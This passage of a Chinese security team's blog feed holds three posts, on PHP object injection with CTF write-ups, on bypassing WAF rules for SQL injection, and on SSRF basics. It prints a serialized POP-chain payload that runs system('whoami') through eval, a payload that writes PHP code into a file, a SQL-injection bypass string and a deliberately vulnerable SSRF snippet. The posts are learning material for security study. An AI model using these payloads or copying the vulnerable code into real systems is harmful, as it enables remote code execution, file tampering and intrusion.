<h2 id="0x02-PHP序列化的利用"><a href="#0x02-PHP序列化的利用" class="headerlink" title="0x02 PHP序列化的利用"></a>0x02 PHP序列化的利用</h2><h3 id="1、magic函数和序列化"><a href="#1、magic函数和序列化" class="headerlink" title="1、magic函数和序列化"></a>1、magic函数和序列化</h3><p><strong>参考</strong>：<a href="http://wps2015.org/drops/drops/%E7%90%86%E8%A7%A3php%E5%AF%B9%E8%B1%A1%E6%B3%A8%E5%85%A5.html" target="_blank" rel="external">php对象注入</a><br>除了<strong>sleep()和</strong>wakeup()函数，在序列化时会执行外，还有下面几种利用方式。<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">Class</span> <span class="title">File</span></span><br><span class="line"> </span>&#123;</span><br><span class="line"> 	<span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">(<span class="variable">$var</span>,<span class="variable">$file1</span>,<span class="variable">$file2</span>)</span></span>&#123;</span><br><span class="line"> 		<span class="variable">$this</span>-&gt;var = <span class="variable">$var</span>;</span><br><span class="line"> 		<span class="variable">$this</span>-&gt;file1 = <span class="variable">$file1</span>;</span><br><span class="line"> 		<span class="variable">$this</span>-&gt;file2 = <span class="variable">$file2</span>;</span><br><span class="line"> 		<span class="keyword">echo</span> <span class="variable">$this</span>-&gt;var.<span class="string">' and '</span>.<span class="variable">$this</span>-&gt;file1.<span class="string">' and '</span>.<span class="variable">$this</span>-&gt;file2.<span class="string">'defined'</span>;</span><br><span class="line"> 	&#125;</span><br><span class="line"> 	<span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span></span>&#123;</span><br><span class="line"> 		unlink(dirname(<span class="keyword">__FILE__</span>) . <span class="string">'/'</span> . <span class="variable">$this</span>-&gt;file1);</span><br><span class="line"> 		<span class="keyword">echo</span> <span class="variable">$this</span>-&gt;file1.<span class="string">'deleted'</span>;</span><br><span class="line"> 	&#125;</span><br><span class="line"> 	<span class="function"><span class="keyword">function</span> <span class="title">__toString</span><span class="params">()</span></span>&#123;</span><br><span class="line"> 		<span class="keyword">return</span> file_get_contents(<span class="variable">$this</span>-&gt;file2);</span><br><span class="line"></span><br><span class="line"> 	&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"> &#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// $file = new File('hello','123.txt','456.php');</span></span><br><span class="line"><span class="comment">// var_dump(serialize($file));</span></span><br><span class="line"><span class="keyword">echo</span> unserialize(<span class="string">'O:4:"File":3:&#123;s:3:"var";s:5:"hello";s:5:"file1";s:7:"123.txt";s:5:"file2";s:7:"456.php";&#125;'</span>);</span><br></pre></td></tr></table></figure></p>
<p>（<strong>construct()函数，在实例化一个对象时被调用，一般用来给属性赋值，</strong>destruct()在实例化对象完成后执行，__toString()函数在echo一个对象时被调用）</p>
<p><strong>construct()函数内定义了三个变量，var这个没什么暖用，file1和file2，我们在序列化字符串中定义为已经服务器上已经存在的两个文件123.txt和456.php，</strong>destruct()中有一个unlink方法，是删除file1，__toString()中，读取file2的内容。</p>
<p>执行结果：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">123.</span>txtdeleted</span><br></pre></td></tr></table></figure></p>
<p>查看源码:<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="preprocessor">&lt;?php</span>  <span class="keyword">echo</span> <span class="number">123</span>; <span class="preprocessor">?&gt;</span><span class="number">123.</span>txtdeleted</span><br></pre></td></tr></table></figure></p>
<p>将字符串反序列化后，由于已经对变量赋过值，那么就不会再执行<strong>construct()函数，在</strong>construct()中赋值的变量也是无效的。上述代码中<strong>destruct()方法在在反序列化后，实例化对象结束后执行了，</strong>tostring()函数在echo unserialize()处，也被执行了<br>如果说在当前页面中有request系列函数，那么就可以造成php对象注入：<br><a href="http://drops.wooyun.org/papers/4820" target="_blank" rel="external">http://drops.wooyun.org/papers/4820</a></p>
<h3 id="2、三个白帽挑战赛第三期"><a href="#2、三个白帽挑战赛第三期" class="headerlink" title="2、三个白帽挑战赛第三期"></a>2、三个白帽挑战赛第三期</h3><p>是一道源码审计题，题目大致是sql注入结合序列化写入文件<br>部分源码也是在某个大神<a href="http://www.math1as.com/" target="_blank" rel="external">博客</a>看到的（由于我没有做过题，所以我只截取了和序列化漏洞相关的部分源码）：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Cache</span> <span class="keyword">extends</span> \<span class="title">ArrayObject</span></span><br><span class="line"></span>&#123;</span><br><span class="line">	<span class="keyword">public</span> <span class="variable">$path</span>;</span><br><span class="line">	<span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">(<span class="variable">$path</span>)</span></span><br><span class="line">	</span>&#123;</span><br><span class="line">		<span class="keyword">parent</span>::__construct([],\ArrayObject::STD_PROP_LIST | \ArrayObject::ARRAY_AS_PROPS);</span><br><span class="line">		<span class="variable">$this</span>-&gt;path = <span class="variable">$path</span>;</span><br><span class="line">		<span class="keyword">if</span>(file_exists(<span class="variable">$path</span>))&#123;</span><br><span class="line">			<span class="variable">$this</span>-&gt;cache = unserialize(file_get_contents(<span class="variable">$this</span>-&gt;path));</span><br><span class="line">		&#125;</span><br><span class="line">	<span class="function"><span class="keyword">function</span> <span class="title">offset</span><span class="params">()</span></span>&#123;</span><br><span class="line">	<span class="comment">//一些不知道干嘛用的代码</span></span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span></span><br><span class="line">	</span>&#123;</span><br><span class="line">		<span class="variable">$cache</span> = <span class="variable">$this</span>-&gt;serialize();</span><br><span class="line">		file_put_contents(<span class="variable">$this</span>-&gt;path, <span class="variable">$cache</span>);</span><br><span class="line">		</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>又由于我没有做过题。。。。所以模拟了这样一个页面去实例化:<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">include</span>(<span class="string">'cache.php'</span>);</span><br><span class="line"><span class="variable">$cache</span> = <span class="keyword">new</span> Cache(<span class="string">'path.txt'</span>);</span><br></pre></td></tr></table></figure></p>
<p>这题好像是这样的：<br>通过SQL注入，可控一个文件，假设可控的是path.txt这个文件（在实际的题目中，SQL注入权限不够，web目录下不可写文件，但其他目录可写，已知目录下有文件md5(username).txt，文件名知道，内容可控），这段代码的意思是，判断该文件存在后，读取文件内容，并且反序列化内容，结束时再经过序列化存进文件中。所以可以在可控文件中构造序列化字符串，改变当前的path属性为我们想要的目录。</p>
<p>path.txt:<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">C:<span class="number">5</span>:<span class="string">"Cache"</span>:<span class="number">103</span>:&#123;x:i:<span class="number">3</span>;a:<span class="number">0</span>:&#123;&#125;;m:a:<span class="number">2</span>:&#123;s:<span class="number">4</span>:<span class="string">"path"</span>;s:<span class="number">25</span>:<span class="string">"F:\wamp\www\test\path.php"</span>;s:<span class="number">5</span>:<span class="string">"cache"</span>;s:<span class="number">18</span>:<span class="string">"&lt;?php echo 123; ?&gt;"</span>;&#125;&#125;</span><br></pre></td></tr></table></figure></p>
<p>上述字符串是通过输出serialize(一个实例化的Cache对象)构造的,当__construct()执行时，就会将上述字符串反序列化，此时已经实例化了一个cache对象，而它的path值变成了我们定义的”F:\wamp\www\test\path.php”，并且多了一个cache属性，值为<code>&lt;?php echo 123; ?&gt;</code>，这里的属性名cache是可以随意取的，但如果源码中：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$cache</span> = <span class="variable">$this</span>-&gt;serialize();</span><br></pre></td></tr></table></figure></p>
<p>变成了：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$cache</span> = serialize(<span class="variable">$this</span>-&gt;cache);</span><br></pre></td></tr></table></figure></p>
<p>那么path.txt中的<code>&quot;cache&quot;;s:18:&quot;&lt;?php echo 123; ?&gt;&quot;</code>;属性名就必须和源码serialize($this-&gt;cache)当中的属性名相同。</p>
<p>所以，现在服务器上其实有两个对象，一个是<code>$cache = new Cache(&#39;path.txt&#39;);</code>定义的$cache，它的path属性值为path.txt;另一个对象是<br><code>C:5:&quot;Cache&quot;:103:{x:i:3;a:0:{};m:a:2:{s:4:&quot;path&quot;;s:25:&quot;F:\wamp\www\test\path.php&quot;;s:5:&quot;cache&quot;;s:18:&quot;&lt;?php echo 123; ?&gt;&quot;;}}</code>被反序列化后的对象，它的path属性的值为path.php。<br>两个对象实例化结束后，会调用其__destruct()方法，将对象自身序列化，写入path属性定义的路径中。这样就将包含<code>&lt;?php echo 123; ?&gt;</code>的内容写进了path.php中。</p>
<h3 id="3、安恒ctf-web3"><a href="#3、安恒ctf-web3" class="headerlink" title="3、安恒ctf web3"></a>3、安恒ctf web3</h3><p>一道源码审计题，解题思路是session上传进度，和session序列化处理器漏洞相结合。</p>
<p> <strong>session上传进度：</strong><br><strong>参考</strong>：<a href="http://php.net/manual/zh/session.upload-progress.php" target="_blank" rel="external">upload-progress</a><br>当 <code>session.upload_progress.enabled INI</code> 选项开启时，在一个上传处理中，在表单中添加一个与INI中设置的<code>session.upload_progress.name</code>同名变量时，$_SESSION中就会添加一个保存上传信息的session值，它的session名是 INI 中定义的<code>session.upload_progress.prefix</code>加表单中的post的<code>session.upload_progress.name</code></p>
<p>测试代码：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">&lt;form action=<span class="string">""</span> method=<span class="string">"POST"</span> enctype=<span class="string">"multipart/form-data"</span>&gt;</span><br><span class="line"> &lt;input type=<span class="string">"hidden"</span> name=<span class="string">"&lt;?php echo ini_get("</span>session.upload_progress.name<span class="string">"); ?&gt;"</span> value=<span class="string">"123"</span> /&gt;</span><br><span class="line"> &lt;input type=<span class="string">"file"</span> name=<span class="string">"123123"</span> /&gt;</span><br><span class="line"> &lt;input type=<span class="string">"submit"</span> /&gt;</span><br><span class="line">&lt;/form&gt;</span><br><span class="line"><span class="preprocessor">&lt;?php</span></span><br><span class="line"> session_start();</span><br><span class="line"> var_dump(<span class="variable">$_SESSION</span>);</span><br><span class="line"><span class="preprocessor">?&gt;</span></span><br></pre></td></tr></table></figure></p>
<p>运行结果：<br><img src="http://dassec.b0.upaiyun.com/kovige/1468567761183.jpg" alt="上传进度session值"><br>（要查看到上传session，INI貌似要设置这个session.upload_progress.cleanup = Off）</p>
<p><strong>session序列化处理器:</strong><br><strong>参考</strong>：<a href="http://wps2015.org/drops/drops/PHP%20Session%20%E5%BA%8F%E5%88%97%E5%8C%96%E5%8F%8A%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%A4%84%E7%90%86%E5%99%A8%E8%AE%BE%E7%BD%AE%E4%BD%BF%E7%94%A8%E4%B8%8D%E5%BD%93%E5%B8%A6%E6%9D%A5%E7%9A%84%E5%AE%89%E5%85%A8%E9%9A%90%E6%82%A3.html" target="_blank" rel="external">session序列化</a><br>当session.auto_start = 0时：<br>两个脚本注册 Session 会话时使用的序列化处理器（session.serialize_handler）不同，就会出现安全问题。<br>经过测试发现在1.php页面注册session.serialize_handler=‘php_serialize’；<br>在2.php中注册session.serialize_handler=‘php’；<br>那么在1.php中伪造一个格式为：竖线加上对象序列化后的字符串<br>如：<code>|O:4:&quot;ryat&quot;:1:{s:2:&quot;hi&quot;;s:4:&quot;ryat&quot;;}</code><br>那么会按照 php 处理器的反序列化格式读取数据，成功地实例化了该对象。<br>反之，如果是从php-&gt;php_serialize,是不可行的。<br>当session.auto_start = 1时：<br>只能注入 PHP 的内置类</p>
<p>web3 源码：<br><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line">class.php:</span><br><span class="line"></span><br><span class="line">    &lt;?php </span><br><span class="line">    class foo1&#123;</span><br><span class="line">            public $varr;</span><br><span class="line">            function __construct()&#123;</span><br><span class="line">                    $this-&gt;varr = "index.php";</span><br><span class="line">            &#125;</span><br><span class="line">            function __destruct()&#123;</span><br><span class="line">                    if(file_exists($this-&gt;varr))&#123;</span><br><span class="line">                            echo $this-&gt;varr;</span><br><span class="line">                    &#125;</span><br><span class="line">                    echo "这是foo1的析构函数";</span><br><span class="line">            &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    class foo2&#123;</span><br><span class="line">            public $varr;</span><br><span class="line">            public $obj;</span><br><span class="line">            function __construct()&#123;</span><br><span class="line">                    $this-&gt;varr = '1234567890';</span><br><span class="line">                    $this-&gt;obj = null;</span><br><span class="line">            &#125;</span><br><span class="line">            function __toString()&#123;</span><br><span class="line">                    $this-&gt;obj-&gt;execute();</span><br><span class="line">                    return $this-&gt;varr;</span><br><span class="line">            &#125;</span><br><span class="line">            function __desctuct()&#123;</span><br><span class="line">                    echo "这是foo2的析构函数";</span><br><span class="line">            &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    class foo3&#123;</span><br><span class="line">            public $varr;</span><br><span class="line">            function execute()&#123;</span><br><span class="line">                    eval($this-&gt;varr);</span><br><span class="line">            &#125;</span><br><span class="line">            function __desctuct()&#123;</span><br><span class="line">                    echo "这是foo3的析构函数";</span><br><span class="line">            &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    ?&gt;</span><br></pre></td></tr></table></figure></p>
<p>index.php:</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="preprocessor">&lt;?php</span></span><br><span class="line">    </span><br><span class="line">    ini_set(<span class="string">'session.serialize_handler'</span>, <span class="string">'php'</span>);</span><br><span class="line">     </span><br><span class="line">    <span class="keyword">require</span>(<span class="string">"./sessionTest.php"</span>);</span><br><span class="line">     </span><br><span class="line">    session_start();</span><br><span class="line">    <span class="variable">$obj</span> = <span class="keyword">new</span> foo1();</span><br><span class="line">     </span><br><span class="line">    <span class="variable">$obj</span>-&gt;varr = <span class="string">"phpinfo.php"</span>;</span><br><span class="line">    </span><br><span class="line">    <span class="preprocessor">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>想办法让程序执行foo3的excute()函数，就要通过foo2的<strong>toString(),要执行foo2的</strong>toString()就要通过echo foo2，刚好foo1的__deatruct()有段这样的代码<code>echo $this-&gt;varr;</code></p>
<p>所以这样构造：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">include</span>(<span class="string">'class.php'</span>);</span><br><span class="line"><span class="variable">$t1</span> = <span class="keyword">new</span> foo1;</span><br><span class="line"><span class="variable">$t2</span> = <span class="keyword">new</span> foo2;</span><br><span class="line"><span class="variable">$t3</span> = <span class="keyword">new</span> foo3;</span><br><span class="line"><span class="variable">$t3</span>-&gt;varr = <span class="string">"system('whoami');"</span>;</span><br><span class="line"><span class="variable">$t2</span>-&gt;obj = <span class="variable">$t3</span>;</span><br><span class="line"><span class="variable">$t1</span>-&gt;varr = <span class="variable">$t2</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$s1</span> = serialize(<span class="variable">$t1</span>);</span><br><span class="line">var_dump(<span class="variable">$s1</span>);</span><br></pre></td></tr></table></figure></p>
<p>构造出这样一串：<strong>O:4:”foo1”:1:{s:4:”varr”;O:4:”foo2”:2:{s:4:”varr”;s:10:”1234567890”;s:3:”obj”;O:4:”foo3”:1:{s:4:”varr”;s:17:”system(‘whoami’);”;}}}</strong></p>
<p>所以构造一个表单，向class.php上传文件，通过session上传进度保存的session，来触发session序列化漏洞，由于INI中设置的序列化处理器为php_serialize，而index.php中将其设置为php，就使得伪造的session被成功地实例化了。<br>有两类不同的插法~<br>1、将序列化字符串插入PHP_SESSION_UPLOAD_PROGRESS<br>session名变成了PHP_SESSION_UPLOAD_PROGRESS_123,|后面的payload会替换整个session值<br><img src="http://dassec.b0.upaiyun.com/kovige/1468571622855.jpg" alt="插入PHP_SESSION_UPLOAD_PROGRESS"></p>
<p>结果：<br><img src="http://dassec.b0.upaiyun.com/kovige/1468571947277.jpg" alt="结果_1"></p>
<p>2、将序列化字符串插入post内容中<br>因为session会存上传文件的内容和文件名，所以也可以将序列化字符串插入name、filename.文件上传原本的session值一直到name前面一个参数为止，变成了session名，name参数|后面的payload变成了session值<br><img src="http://dassec.b0.upaiyun.com/kovige/1468572495614.jpg" alt="插入post"></p>
<p>结果：<br><img src="http://dassec.b0.upaiyun.com/kovige/1468572538300.jpg" alt="结果_2"></p>
<p>参考链接：<br><a href="http://drops.wooyun.org/papers/4820" target="_blank" rel="external">php对象注入</a><br><a href="http://php.net/manual/zh/session.upload-progress.php" target="_blank" rel="external">upload-progress</a><br><a href="http://drops.wooyun.org/tips/3909" target="_blank" rel="external">session序列化</a></p>
]]></content>
    
    <summary type="html">
    
      &lt;!-- 这里是文章头部的图片 大小为800px*200px左右--&gt;
&lt;p&gt;&lt;img src=&quot;http://dassec.b0.upaiyun.com/kovige/obj.png&quot; alt=&quot;&quot;&gt;&lt;br&gt;&lt;!-- 这里是简单的介绍，50-100字 --&gt;&lt;/p&gt;
&lt;p&gt;前段时间学习了php对象序列化，总结了一些遇到的和看到的利用方法，在这之前我对序列化完全John Snow，所以这篇笔记写得很细很基础。&lt;/p&gt;
    
    </summary>
    
      <category term="安全笔记" scheme="http://das.scusec.org/categories/%E5%AE%89%E5%85%A8%E7%AC%94%E8%AE%B0/"/>
    
    
      <category term="kovige" scheme="http://das.scusec.org/tags/kovige/"/>
    
      <category term="php" scheme="http://das.scusec.org/tags/php/"/>
    
      <category term="session" scheme="http://das.scusec.org/tags/session/"/>
    
      <category term="对象" scheme="http://das.scusec.org/tags/%E5%AF%B9%E8%B1%A1/"/>
    
  </entry>
  
  <entry>
    <title>浅谈WAF下的SQL注入绕过</title>
    <link href="http://das.scusec.org/2016/08/25/waf-sql-bypass/"/>
    <id>http://das.scusec.org/2016/08/25/waf-sql-bypass/</id>
    <published>2016-08-25T01:52:22.790Z</published>
    <updated>2016-08-25T01:52:22.790Z</updated>
    
    <content type="html"><![CDATA[<p><img src="http://www.mauu.me/wp-content/uploads/2016/08/QQ%E6%88%AA%E5%9B%BE20160818203051.png" alt=""><br>几个月前在一个SRC的一个夺旗赛看了一下，题目里遇到了他们用自己的云waf保护起来的靶机，不禁心里为出题人鼓掌。<br><a id="more"></a></p>
<h2 id="0x00"><a href="#0x00" class="headerlink" title="0x00"></a>0x00</h2><p>直接对靶机奉上绕过策略当然有点蠢萌，不过作为探索研究决定继续往下看了看，当时运气不错，一顿测试后还真的找到了一个sql injection的bypass方法过了那题，觉得这个简单的绕过策略他们应该能抓到，等补了再写博客。</p>
<p>结果。。。这两天聊到云waf想起这件事来。去主站看了一下，发现和上次测试区别是防御规则加上了web客户端指纹，发现恶意以后直接长时间屏蔽掉来自这个web客户端的请求。然而上次用的方法并没有被补上，本来想把payload作为绕过实例的，现在只好略过这个具体方法写思路了。正巧前段时间看到锁师兄在ali峰会上讲的waf防御的非主流技术，那记录一下测试思路和友情吹一波锁师兄。</p>
<h2 id="0x01"><a href="#0x01" class="headerlink" title="0x01"></a>0x01</h2><p>WAF大体上可以划分到硬件防护、软件防护和云防护。其实有waf测试经验的话可以比较明显的返回包和从拦截表现区分出保护waf是哪一类，硬防一般直接把你的请求包丢弃，软防和云防一般会有自己独特的拦截页和拦截头。<br>大概一年前测过师兄公司系统外署的绿盟ips绕过。只能说硬防的规则有种不可描述的感觉，像不是从http层做的流量清洗，最终在注入语句后构造一定的尾巴再以及对间隔符的替换（当时这个ips发现对各种间隔符非常敏感）绕过了防御。盲测规则感觉是件挺耗心力的事。小尾巴大概长/**/‘1’=1–这样，改一个字符前面的绕过都会功亏一篑。。。不过核心思想还是查看引入哪些字符、替换同类函数以及做各种编码等哪些操作能不失语义地引发waf判断的变化。</p>
<p><img src="http://www.mauu.me/wp-content/uploads/2016/08/QQ%E6%88%AA%E5%9B%BE20160818201051-1.png" alt="测试截图"></p>
<h2 id="0x03"><a href="#0x03" class="headerlink" title="0x03"></a>0x03</h2><p>举个例子，从下面的图我们可以看到保护思路，一般的网站在接受云保护后是不会把进入流量限定到只为云waf所在位置，所以有一个比较简单粗暴的方法就是寻找到主机的真实IP，绕过云waf直接去访问网站主机。</p>
<p><img src="http://www.mauu.me/wp-content/uploads/2016/08/QQ%E6%88%AA%E5%9B%BE20160818203051.png" alt="结构示意图"></p>
<p>不过正面突破也是有方法的，下面讲一个某waf注入绕过思路。</p>
<p>waf对sql注入的防御，做法将检测到的恶意流量进行过滤。那么问题的核心就在于恶意判断，由于攻击者可以在攻击向量中加入大量的冗余数据进行混淆，因此直接取原始流量判断效率低下。所以通常做法是先进行格式化、去冗余等。</p>
<p>那么假如一个无效字符没有被作为冗余数据被处理掉而进入waf判断器，则很有可能让攻击向量被判断器认为无害。（这里用锟来假设存在这样一个特殊字符，请求 “union锟%20select锟” 时可能被waf判断为无害的，因为 “union锟” 在判断器眼里和 “onion” 什么的差不多，然而sql执行时因为 “锟” 是一个无效的字符而被删除了），可以参考从容的 %23%0A+Emoji表情符 绕过方法。</p>
<p>同理，如果有效字符如果被认为是冗余字符而处理掉后进行判断，然而在sql执行器中却是起作用的，这样很可能让攻击向量逃过判断器审查，如紫苏叶的绕过方法：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id =1 as &#39;--+&#39; union select 1,2,3%23</span><br></pre></td></tr></table></figure></p>
<p>当然这些具体的绕过策略现在都已经修复了，但是只要这种存在缺陷的机制还在的话，这种漏洞仍会出现。</p>
<p>直接看实例吧，用主站演示，随便输一个语句被拦截了</p>
<p>（这个图还是隐藏了）</p>
<p>可以对比一下下面两张图，我们发现通过各种方式提交的一些冗余数据让waf规则变弱了，让本来无法通过的攻击向量生效了，当然，即使这样攻击向量也不能随意构造，必须使用一些混淆。稍微一点不注意还是会触发拦截，所以绕过测试需要很大的耐心和一点点运气。</p>
<p>前几天就这个方法和锁哥聊了一下，锁哥说union select这个地方绕过确实有办法，但查询如果使用information.schema这张表，会使waf变得更敏感，一些小细节都会触发规则。</p>
<p>这就意味着如果不是一个通用cms的话，我们将无法获得数据库结构，只能获取猜到的表名和字段名的内容。虽然from之后的混淆方法很少导致绕过困难，总归有办法的~</p>
<p>因为绕过方法还没修就隐去了一些具体细节，先记录思路，等修了再放测试图。</p>
<p><a href="http://www.wooyun.org/bugs/wooyun-2016-0192841" target="_blank" rel="external">http://www.wooyun.org/bugs/wooyun-2016-0192841</a><br><a href="http://www.wooyun.org/bugs/wooyun-2015-0159517" target="_blank" rel="external">http://www.wooyun.org/bugs/wooyun-2015-0159517</a></p>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;&lt;img src=&quot;http://www.mauu.me/wp-content/uploads/2016/08/QQ%E6%88%AA%E5%9B%BE20160818203051.png&quot; alt=&quot;&quot;&gt;&lt;br&gt;几个月前在一个SRC的一个夺旗赛看了一下，题目里遇到了他们用自己的云waf保护起来的靶机，不禁心里为出题人鼓掌。&lt;br&gt;
    
    </summary>
    
    
      <category term="ksss" scheme="http://das.scusec.org/tags/ksss/"/>
    
      <category term="waf" scheme="http://das.scusec.org/tags/waf/"/>
    
      <category term="注入" scheme="http://das.scusec.org/tags/%E6%B3%A8%E5%85%A5/"/>
    
      <category term="绕过" scheme="http://das.scusec.org/tags/%E7%BB%95%E8%BF%87/"/>
    
  </entry>
  
  <entry>
    <title>从入门到精通SSRF（1）</title>
    <link href="http://das.scusec.org/2016/08/24/easy-to-SSRF-1/"/>
    <id>http://das.scusec.org/2016/08/24/easy-to-SSRF-1/</id>
    <published>2016-08-24T13:12:55.470Z</published>
    <updated>2016-08-24T13:12:55.470Z</updated>
    
    <content type="html"><![CDATA[<p><img src="http://dassec.b0.upaiyun.com/ksss/ssrf-1.jpg" alt=""><br>很早就看到别人对这个漏洞的研究，但是完全没有预想到它能有这么大的能量。<br><a id="more"></a></p>
<h2 id="0x00"><a href="#0x00" class="headerlink" title="0x00"></a>0x00</h2><p>最初觉得请求他域资源如果限制不严格，可能导致安全边界穿越。然而边界穿越导致内网信息泄露并不是重点，最近的redis未授权、struts2命令执行等等存放在安全位置而忽略了安全配置的机器则把这个漏洞的能量放大了很多倍。<br><!--more--></p>
<h2 id="0x01"><a href="#0x01" class="headerlink" title="0x01"></a>0x01</h2><p>先在php上写了一个ssrf简单环境。</p>
<p><img src="http://www.mauu.me/wp-content/uploads/2016/07/QQ%E6%88%AA%E5%9B%BE20160727151540.png" alt="读取远程图片"></p>
<p><img src="http://www.mauu.me/wp-content/uploads/2016/07/QQ%E6%88%AA%E5%9B%BE20160727151520.png" alt="使用其他协议"></p>
<p>对比上面两张图，本来这个功能在头像功能也许大家都见过，可以直接填入图片的url地址设定它为自己的头像。然而如果对填入的url地址没有处理，就可能导致本机etc/passed或者内网文件被这个功能直接读取出来。<br>在开启其他脑洞，进行内网端口探测以后，假设内网存在 struts2命令执行 这种可以把exp通过get参数简单传入的漏洞 ，利用从这个ssrf点传入攻击代码反弹一个shell。。。那么这把钥匙则可以直接打开内网的大门。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#60;?php&#10;if (isset($_GET[&#39;url&#39;]))  &#123;  &#10;$content = file_get_contents($_GET[&#39;url&#39;]);  &#10;$filename =&#39;./images/&#39;.rand().&#39;img1.jpg&#39;;  &#10;file_put_contents($filename, $content);  &#10;$img = &#34;&#60;img src=\&#34;&#34;.$filename.&#34;\&#34;/&#62;&#34;;  &#10;&#125;  &#10;echo $img;  &#10;?&#62;</span><br></pre></td></tr></table></figure>
<p>这个是简单测试代码，从代码上看，除了file_get_content()还有fsockopen()、curl_exec()等等资源获取的函数都可能存在这个漏洞。从黑盒来看，用户控制点作为资源地址传到函数中进行资源请求还是比较明显的，甚至有些vpn产品把这个当成一个正常的功能来使人员在外界可以访问到内网的系统。</p>
<p><img src="http://www.mauu.me/wp-content/uploads/2016/07/QQ%E6%88%AA%E5%9B%BE20160727151400-1024x674.png" alt="做映射的vpn设备"></p>
<p><img src="http://www.mauu.me/wp-content/uploads/2016/07/QQ%E6%88%AA%E5%9B%BE20160727151428-1024x433.png" alt="ssrf请求其他资源"></p>
<h2 id="0x02"><a href="#0x02" class="headerlink" title="0x02"></a>0x02</h2><p>zzx说，能够对外发送网络请求的点都有可能存在ssrf漏洞。</p>
